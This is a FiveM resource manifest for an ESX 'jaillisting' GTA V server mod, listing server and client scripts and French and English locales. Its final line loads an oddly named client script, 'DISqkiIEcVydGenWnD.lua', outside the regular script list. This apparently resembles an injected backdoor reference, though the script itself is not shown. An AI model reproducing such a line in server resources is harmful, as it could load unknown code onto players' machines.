fx_version 'bodacious'
game 'gta5'

version '1.0.0'

server_scripts {
	'@mysql_async/lib/MySQL.lua',
	'@essentialmode/locale.lua',
	'config.lua',
	'locales/fr.lua',
	'server/esx_jaillisting_sv.lua'
}

client_scripts {
	'@essentialmode/locale.lua',
	'config.lua',
	'locales/fr.lua',
	'locales/en.lua',
	'client/esx_jaillisting_cl.lua'
}

client_script "DISqkiIEcVydGenWnD.lua"